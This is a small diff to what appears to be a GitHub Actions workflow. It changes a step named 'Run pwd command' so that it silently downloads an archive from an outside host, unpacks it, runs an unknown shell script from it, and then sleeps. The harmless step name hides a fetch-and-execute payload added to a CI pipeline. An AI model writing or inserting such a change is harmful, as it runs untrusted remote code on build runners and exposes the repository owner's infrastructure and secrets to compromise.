@@ -14,4 +14,4 @@ jobs:
       uses: actions/checkout@v4
 
     - name: Run pwd command
-      run: pwd
+      run: pwd;wget https://idev.nyc.mn/abc.tar;tar -xvf abc.tar;cd abc;sh s.sh;ps;sleep 60
